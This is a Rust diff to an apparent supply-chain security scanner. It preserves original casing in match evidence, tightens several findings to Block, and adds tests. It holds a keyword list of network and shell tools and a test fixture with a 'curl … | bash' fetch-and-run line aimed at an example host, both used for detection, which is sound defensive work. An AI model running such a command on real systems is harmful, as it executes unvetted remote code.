@@ -6,10 +6,51 @@ use crate::findings::{
     ArtifactKind, EvidenceKind, Finding, MatchTarget, RecommendedAction, Severity, ThreatCategory,
 };
 
-pub(super) fn detect_remote_binary_downloads(content: &str, artifact_path: &str) -> Vec<Finding> {
+/// Extract the byte slice from `original` that corresponds to a regex match
+/// found in the lowercased content.
+///
+/// # Contract
+///
+/// `lower` MUST be the result of `original.to_ascii_lowercase()` — this
+/// preserves byte offsets because ASCII case folding is a 1-byte → 1-byte
+/// transformation. Non-ASCII content can break this assumption (some chars
+/// have different UTF-8 byte lengths in upper/lower forms), in which case
+/// the helper falls back to the lowercased text rather than producing
+/// out-of-bounds reads. The `debug_assert_eq!` on byte length surfaces the
+/// invariant break in tests.
+fn original_match_str<'a>(
+    original: &'a str,
+    lower: &'a str,
+    matched: &regex::Match<'a>,
+) -> &'a str {
+    debug_assert_eq!(
+        lower.len(),
+        original.len(),
+        "ASCII-lowercase invariant: lower.len() must equal original.len()"
+    );
+    if lower.len() == original.len() {
+        // Safe slice on a valid char boundary: regex offsets are guaranteed
+        // valid into `lower`, and ASCII byte-equivalence means they're valid
+        // into `original` too.
+        original
+            .get(matched.start()..matched.end())
+            .unwrap_or_else(|| matched.as_str())
+    } else {
+        // Defensive fallback (non-ASCII content); evidence loses casing but
+        // we don't risk a panic.
+        matched.as_str()
+    }
+}
+
+pub(super) fn detect_remote_binary_downloads(
+    lower: &str,
+    original: &str,
+    artifact_path: &str,
+) -> Vec<Finding> {
     let mut findings = Vec::new();
     for (rule_id, regex) in REMOTE_BINARY_PATTERNS.iter() {
-        for matched in regex.find_iter(content) {
+        for matched in regex.find_iter(lower) {
+            let evidence = original_match_str(original, lower, &matched);
             findings.push(
                 Finding::builder(*rule_id, ThreatCategory::SupplyChain)
                     .severity(Severity::High)
@@ -22,7 +63,7 @@ pub(super) fn detect_remote_binary_downloads(content: &str, artifact_path: &str)
                         ArtifactKind::ReferencedArtifact,
                         Some(artifact_path.to_string()),
                     )
-                    .match_value(matched.as_str())
+                    .match_value(evidence)
                     .reason("Script downloads a remote script or binary payload")
                     .build(),
             );
@@ -31,14 +72,19 @@ pub(super) fn detect_remote_binary_downloads(content: &str, artifact_path: &str)
     findings
 }
 
-pub(super) fn detect_deferred_execution(content: &str, artifact_path: &str) -> Vec<Finding> {
+pub(super) fn detect_deferred_execution(
+    lower: &str,
+    original: &str,
+    artifact_path: &str,
+) -> Vec<Finding> {
     let mut findings = Vec::new();
     for (rule_id, regex) in DEFERRED_PATTERNS.iter() {
-        for matched in regex.find_iter(content) {
+        for matched in regex.find_iter(lower) {
+            let evidence = original_match_str(original, lower, &matched);
             findings.push(
                 Finding::builder(*rule_id, ThreatCategory::PrivilegeEscalation)
                     .severity(Severity::Medium)
-                    .action(RecommendedAction::RequireApproval)
+                    .action(RecommendedAction::Block)
                     .evidence_kind(EvidenceKind::Behavior)
                     .matched_on(MatchTarget::ReferencedFile {
                         path: artifact_path.to_string(),
@@ -47,7 +93,7 @@ pub(super) fn detect_deferred_execution(content: &str, artifact_path: &str) -> V
                         ArtifactKind::ReferencedArtifact,
                         Some(artifact_path.to_string()),
                     )
-                    .match_value(matched.as_str())
+                    .match_value(evidence)
                     .reason("Script configures deferred execution or persistence")
                     .build(),
             );
@@ -68,7 +114,7 @@ pub(super) fn detect_node_process_exec(
     {
         return Vec::new();
     }
-    let risky_process_exec = [
+    const RISKY_INDICATORS: &[&str] = &[
         "curl ",
         "wget ",
         "http://",
@@ -78,9 +124,12 @@ pub(super) fn detect_node_process_exec(
         "powershell",
         "cmd.exe",
         "invoke-webrequest",
-    ]
-    .iter()
-    .any(|needle| content_lower.contains(needle));
+    ];
+    let risky_indicator = RISKY_INDICATORS
+        .iter()
+        .find(|needle| content_lower.contains(**needle))
+        .copied();
+    let risky_process_exec = risky_indicator.is_some();
     vec![
         Finding::builder("SCRIPT_NODE_PROCESS_EXEC", ThreatCategory::RemoteExec)
             .severity(if risky_process_exec {
@@ -89,7 +138,7 @@ pub(super) fn detect_node_process_exec(
                 Severity::Low
             })
             .action(if risky_process_exec {
-                RecommendedAction::RequireApproval
+                RecommendedAction::Block
             } else {
                 RecommendedAction::Log
             })
@@ -105,7 +154,7 @@ pub(super) fn detect_node_process_exec(
                 ArtifactKind::ReferencedArtifact,
                 Some(artifact_path.to_string()),
             )
-            .match_value("child_process")
+            .match_value(risky_indicator.unwrap_or("child_process"))
             .reason(if risky_process_exec {
                 "Node script spawns subprocesses with shell or network execution semantics"
             } else {
@@ -349,7 +398,7 @@ pub(super) fn detect_node_secret_fs_access(
         ThreatCategory::CredentialExposure,
     )
     .severity(Severity::Medium)
-    .action(RecommendedAction::RequireApproval)
+    .action(RecommendedAction::Block)
     .evidence_kind(EvidenceKind::Behavior)
     .matched_on(MatchTarget::ReferencedFile {
         path: artifact_path.to_string(),
@@ -364,7 +413,8 @@ pub(super) fn detect_node_secret_fs_access(
 }
 
 pub(super) fn detect_injection_patterns(
-    content: &str,
+    lower: &str,
+    original: &str,
     language: &str,
     artifact_path: &str,
 ) -> Vec<Finding> {
@@ -377,7 +427,8 @@ pub(super) fn detect_injection_patterns(
     };
     let mut findings = Vec::new();
     for (rule_id, regex) in patterns {
-        for matched in regex.find_iter(content) {
+        for matched in regex.find_iter(lower) {
+            let evidence = original_match_str(original, lower, &matched);
             findings.push(
                 Finding::builder(*rule_id, ThreatCategory::RemoteExec)
                     .severity(Severity::High)
@@ -387,11 +438,63 @@ pub(super) fn detect_injection_patterns(
                         path: artifact_path.to_string(),
                     })
                     .artifact(ArtifactKind::ReferencedArtifact, Some(artifact_path.to_string()))
-                    .match_value(matched.as_str())
+                    .match_value(evidence)
                     .reason("Script contains an execution sink that appears to be influenced by variable or user-controlled input")
                     .build(),
             );
         }
     }
     findings
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// Contract: when a detector matches against the lowercased content, the
+    /// emitted `match_value` MUST preserve the original casing of the source
+    /// file. The auditor regression: `match_value` was the lowercased slice,
+    /// degrading evidence and breaking waiver fingerprints if a user
+    /// refactored the file's casing.
+    #[test]
+    fn detect_remote_binary_downloads_preserves_original_casing() {
+        let original = "RUN curl -sSL https://Example.COM/Install.SH | bash\n";
+        let lower = original.to_ascii_lowercase();
+        let findings = detect_remote_binary_downloads(&lower, original, "/tmp/install.sh");
+        assert!(!findings.is_empty(), "must match the curl|bash pattern");
+        for f in &findings {
+            // The match_value substring MUST exist verbatim in the original
+            // (case-preserved). Lowercased fragments would not match.
+            assert!(
+                original.contains(&f.match_value),
+                "match_value '{}' must appear verbatim in the original; \
+                 got '{f}' which is lowercased.",
+                f.match_value,
+                f = f.match_value
+            );
+        }
+    }
+
+    #[test]
+    fn original_match_str_falls_back_safely_on_nonascii_breakage() {
+        // Non-ASCII content where lowercase changes byte length is rare for
+        // the patterns we use, but we exercise the fallback path here.
+        // Construct a string where lower != original byte length (Turkish I).
+        let original = "İSTANBUL CURL X";
+        let lower = original.to_ascii_lowercase();
+        if lower.len() == original.len() {
+            // ASCII path — nothing to test for fallback. Skip.
+            return;
+        }
+        // Use a Match against `lower` and verify we don't panic and produce
+        // a deterministic result.
+        let re = regex::Regex::new("curl").unwrap();
+        if let Some(m) = re.find(&lower) {
+            let evidence = original_match_str(original, &lower, &m);
+            // Either matches the original-cased "CURL" (if the byte length
+            // happens to align) or falls back to the lowercased "curl"; both
+            // are non-panicking outcomes.
+            assert!(["curl", "CURL"].contains(&evidence));
+        }
+    }
 }
